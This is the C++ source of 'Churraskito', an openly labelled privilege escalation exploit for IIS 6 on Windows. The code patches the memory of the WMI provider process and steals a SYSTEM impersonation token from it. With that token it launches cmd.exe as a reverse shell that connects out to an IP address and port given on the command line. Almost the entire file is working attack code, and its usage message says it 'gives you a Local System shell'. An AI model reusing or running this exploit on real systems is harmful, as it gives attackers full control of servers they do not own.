// Churraskito -> IIS 6 exploit
// by Cesar Cerrudo
// Argeniss - Information Security & Software

// Note: The IIS application pool identity should be Network Service (default) for this exploit to work
// if it's Local Service then some minor changes must be performed on the code

#include "stdafx.h"


BOOL IsImpersonationToken (HANDLE hToken, CHAR * cType)
{
	DWORD ReturnLength;
	SECURITY_IMPERSONATION_LEVEL TokenImpInfo;
	TOKEN_TYPE TokenTypeInfo;

	if(GetTokenInformation(hToken, TokenType,  &TokenTypeInfo, sizeof(TokenTypeInfo), &ReturnLength)){
		if (TokenTypeInfo==TokenImpersonation) {
			if((GetTokenInformation(hToken, TokenImpersonationLevel,  &TokenImpInfo, sizeof(TokenImpInfo), &ReturnLength)&& TokenImpInfo==SecurityImpersonation)){
				if (cType) *cType='I';
				return TRUE;
			}
        }
		else { 
			if (cType) *cType='P'; //it's a primary token, TokenTypeInfo==TokenPrimary
			return TRUE; 
		}
	}

	return FALSE;
}

BOOL GetTokenUser(HANDLE hToken, LPTSTR UserName)
{
	DWORD dwBufferSize = 0;
	SID_NAME_USE SidNameUse;
	TCHAR DomainName[MAX_PATH];
	DWORD dwUserNameSize= MAX_PATH * 2 ;
	DWORD dwDomainNameSize = MAX_PATH * 2;
	PTOKEN_USER pTokenUser;

	GetTokenInformation(hToken, TokenUser, NULL,0,&dwBufferSize);

	pTokenUser = (PTOKEN_USER) new BYTE[dwBufferSize];
	memset(pTokenUser, 0, dwBufferSize);

	if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwBufferSize)){
		if (LookupAccountSid(NULL,pTokenUser->User.Sid,UserName,&dwUserNameSize,DomainName,&dwDomainNameSize,&SidNameUse)){
			return TRUE;
		}
	}
	
	return FALSE;
}

void InvokeWMI(){

	HRESULT hRes;
    _bstr_t bstrServer;
	IWbemLocatorPtr spLocator;
    IWbemServicesPtr spServices;
    IEnumWbemClassObjectPtr spEnum;
    IWbemClassObjectPtr spObject;

	CoInitialize(NULL);
    // create WBEM locator object
    hRes = CoCreateInstance(__uuidof(WbemLocator), NULL,
                        CLSCTX_INPROC_SERVER, __uuidof(IWbemLocator),
                        (PVOID *)&spLocator);
    if (FAILED(hRes))
        _com_issue_error(hRes);
	
    hRes = spLocator->ConnectServer(_bstr_t(L"root\\MicrosoftIISv2"), NULL, NULL, NULL, 0, NULL, NULL, &spServices);
    if (FAILED(hRes))
        _com_issue_error(hRes);

    // create enumerator
	 IEnumWbemClassObject* pEnumerator = NULL;
     hRes = spServices->ExecQuery(
        bstr_t("WQL"), 
        bstr_t("SELECT * FROM IIsWebInfo"),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, 
        NULL,
        &pEnumerator);
}


HANDLE GetWMIProcHandle(){
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
	HANDLE hProcess;
	HMODULE hMod;
	DWORD cbNeeded;
   
	for (DWORD i=0;i<0xffff;i+=4){
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, i );
		if (hProcess)
		{
			if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod),	&cbNeeded) )
			{
				GetModuleBaseName( hProcess, hMod, szProcessName, 
								sizeof(szProcessName)/sizeof(TCHAR) );
				if (!strcmp(szProcessName,"wmiprvse.exe")){
					printf ("/Churraskito/-->Got WMI process Pid: %d <BR>",i);
					return hProcess;
				}
			}
			CloseHandle(hProcess);
		}
	}
	return 0;
}



void PatchProc(HANDLE hProc){
	DWORD dwOldProt;
	char Buff[]="\xc2\x04\x00";
	char Buff2[]="\x6a\x0c\x90";
	LPVOID lpAddress;

	VirtualProtectEx(hProc,CloseHandle,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
	WriteProcessMemory(hProc,CloseHandle,Buff,0x3,NULL);
	VirtualProtectEx(hProc,CloseHandle,0x3,dwOldProt,&dwOldProt);
	
	lpAddress=(LPVOID)((DWORD)OpenThreadToken+0xb);

	VirtualProtectEx(hProc,lpAddress,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
	WriteProcessMemory(hProc,lpAddress,Buff2,0x3,NULL);
	VirtualProtectEx(hProc,lpAddress,0x3,dwOldProt,&dwOldProt);

}

void RestoreProc(HANDLE hProc){
	DWORD dwOldProt;
	char Buff[]="\xc2\x04\x00";

	VirtualProtectEx(hProc,CloseHandle,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
	WriteProcessMemory(hProc,CloseHandle,Buff,0x3,NULL);
	VirtualProtectEx(hProc,CloseHandle,0x3,dwOldProt,&dwOldProt);
}

DWORD WINAPI ThreadProc(LPVOID lpParameter){

	while (1==1){
		InvokeWMI();
		Sleep(20000);
	}
}

DWORD SpawnReverseShell(HANDLE hToken, DWORD dwPort,LPSTR sIP)
{
    HANDLE hToken2,hTokenTmp;
	PROCESS_INFORMATION pInfo;
	STARTUPINFO         sInfo;
	WSADATA wd; 
	SOCKET sock; 
	struct sockaddr_in sin; 
	int size = sizeof(sin); 

	memset(&sin, 0, sizeof(sin)); 
	WSAStartup(MAKEWORD( 1, 1 ), &wd); 
	sock=WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
	sin.sin_family = AF_INET; 
	bind(sock, (struct sockaddr*)&sin, size); 
	sin.sin_port = htons(dwPort); 
	sin.sin_addr.s_addr = inet_addr(sIP); 
	
	DWORD dwRes=connect(sock, (struct sockaddr*)&sin, size);

	if (dwRes!=0){
		printf ("/Churraskito/-->Could not connect to %s<BR>",sIP);
		return 0;
	}
	
    ZeroMemory(&sInfo, sizeof(STARTUPINFO));
    ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
    sInfo.cb= sizeof(STARTUPINFO);
    sInfo.lpDesktop= "WinSta0\\Default"; //so we don't have to wait on the process
 
    sInfo.dwFlags = STARTF_USESTDHANDLES;
    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError =(HANDLE) sock; 


	CHAR cType;
	IsImpersonationToken(hToken, &cType);

	if (cType=='I'){
		SetThreadToken(NULL, hToken);
		OpenThreadToken(GetCurrentThread(),TOKEN_ALL_ACCESS,FALSE,&hTokenTmp);
		SetThreadToken(NULL, NULL);
	}
	else 
		hTokenTmp=hToken;

	DuplicateTokenEx(hTokenTmp,MAXIMUM_ALLOWED,NULL,SecurityImpersonation, TokenPrimary,&hToken2) ;

	LPTSTR lpComspec;
	lpComspec= (LPTSTR) malloc(1024*sizeof(TCHAR));
	GetEnvironmentVariable("comspec",lpComspec,1024);//it won't work if cmd.exe used as commandline param

	dwRes=CreateProcessAsUser(hToken2,  lpComspec ,NULL, NULL, NULL, TRUE,  NULL, NULL, NULL, &sInfo, &pInfo);
	
	if (hTokenTmp!=hToken)
		CloseHandle(hTokenTmp);

	CloseHandle(hToken2);

	return dwRes;

}

bool SetRegistryValues()
{
   HKEY hKey;
   DWORD x=0x0;
   bool result=false;

   if( RegCreateKeyEx(HKEY_USERS,TEXT("S-1-5-20_Classes\\AppID\\{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}"),NULL,NULL,NULL,KEY_ALL_ACCESS,NULL, &hKey,NULL) == ERROR_SUCCESS )
   {
		if (RegSetValueEx(hKey,"AppIDFlags",NULL,REG_DWORD,(PBYTE)&x,sizeof(DWORD))== ERROR_SUCCESS )
		{
			result=true;
		}
   RegCloseKey(hKey);
   }

   return result;
}

bool DelRegistrySubkeys()
{
   bool result=false;

   if( RegDeleteKey(HKEY_USERS,TEXT("S-1-5-20_Classes\\AppID\\{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}")) == ERROR_SUCCESS )
   {
		if( RegDeleteKey(HKEY_USERS,TEXT("S-1-5-20_Classes\\AppID")) == ERROR_SUCCESS )
	    {
			result=true;
		}
   }

   return result;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hToken,hTokenOut;
	TCHAR  UserName[32767];
	DWORD lpThreadId;
	DWORD dwPort;
	LPSTR sIP;
	HANDLE hProc;


	printf ("/Churraskito/-->This exploit gives you a Local System shell <BR>");

	if (argc != 3) {
		printf ("/Churraskito/-->Usage: Churraskito.exe ipaddress port <BR>");
		return 0;
	}
	
	sIP= argv[1];
	dwPort= atoi(argv[2]);


	if (!SetRegistryValues()) {
		printf ("/Churraskito/-->Could not set registry values<BR>");
		return 0;
	}

	CreateThread(NULL,NULL,ThreadProc,NULL,NULL,&lpThreadId);

	Sleep(500);

	hProc=GetWMIProcHandle();

	if (hProc){
		PatchProc(hProc);
		while (1==1){
			for (DWORD j=0x4;j<=0x400;j+=4){
				hToken=(HANDLE)j;
				if (DuplicateHandle(hProc,hToken,GetCurrentProcess(),&hTokenOut,0,FALSE,DUPLICATE_SAME_ACCESS )){
					if (IsImpersonationToken(hTokenOut, NULL) ){
						if(GetTokenUser(hTokenOut, UserName)){
							printf ("/Churraskito/-->Found token %s <BR>",UserName);
							if (!strcmp(UserName,"SYSTEM")){
								DelRegistrySubkeys();
								printf ("/Churraskito/-->Running reverse shell<BR>");
								SpawnReverseShell(hTokenOut,dwPort,sIP);
								return 0;
							}
						}
					}
					CloseHandle(hTokenOut);
				}
			}
			Sleep(500);
		}
		CloseHandle(hProc);
	}

	return 0;
}

